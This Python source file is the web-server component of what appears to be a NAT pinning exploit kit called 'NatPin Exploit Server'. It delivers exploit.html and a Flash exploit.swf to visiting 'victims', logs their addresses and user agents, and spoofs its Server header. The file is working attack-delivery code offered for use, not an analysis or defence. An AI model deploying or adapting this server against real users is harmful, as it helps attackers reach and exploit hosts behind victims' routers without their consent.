#!/usr/bin/env python
#filename=web.py
#This module acts as a very simple HTTP webserver and will feed the exploit page.

from base import *
import socket
import random
import struct
import select
import time

class HTTPProtoHandler(asyncore.dispatcher_with_send):
	REQPAGE = ""
	REQHEADER = ""
	REQHEADERDONE = 0
	def __init__(self,conn_sock, client_address, server):
		global REQHEADER
		global REQHEADERDONE
		REQHEADERDONE = 0
		REQHEADER = ""
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort),1)
	def get_header(self,req,header_name,splitter=":"):
		headers=req.split("\n")
		result = ""
		for header in headers:
			headerparts = header.split(splitter)
			if len(headerparts)>1:
				if headerparts[0].strip().upper()==header_name.upper():
					result = header.strip()
		return result
	def handle_read(self):
		global REQPAGE, REQHEADER, REQHEADERDONE
		data = self.recv(1024)
		request = self.get_header(data,"GET", " ")
		page = ""
		if request <>"":
			headerparts = request.split(" ")
			if headerparts[0]=="GET":
				page = headerparts[1].replace("/","")
				if page =="": page = "exploit.html"
				self.server.log("Victim requested page: " + page,0)
		page = page.split("?")[0]
		if page != "":
			if page=="exploit.html":
				agent = self.get_header(data,"USER-AGENT",":")
				self.server.log("---" + agent,0)
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: 62.213.198.42\r\nContent-Length: $len$\r\n\r\n"""
				f = open("exploit/exploit.html","r")
				body = f.read()
				f.close()
			elif page=="exploit.swf":
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: application/x-shockwave-flash\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
				f = open("exploit/exploit.swf","r")
				body = f.read()
				f.close()
			else:
				respheader="""HTTP/1.1 404 NOT FOUND\r\nServer: NatPin Exploit Server\r\nContent-Length: 0\r\n\r\n"""
				body = ""
			respheader = respheader.replace("$len$",str(len(body)))
			self.send(respheader+body)
			#self.send(body)
#end class

class Server(Base):
	def __init__(self,serverPort=843, caller=None):
		self.TYPE = "Web Server"
		Base.__init__(self,"TCP",serverPort,caller)
		self.log("Started",0)
	#end def
	def protocolhandler(self,conn, addr):
		# FLASH POLICY FILE SUPPORT
		self.HANDLER = HTTPProtoHandler(conn,addr,self)
	#end def
#end class
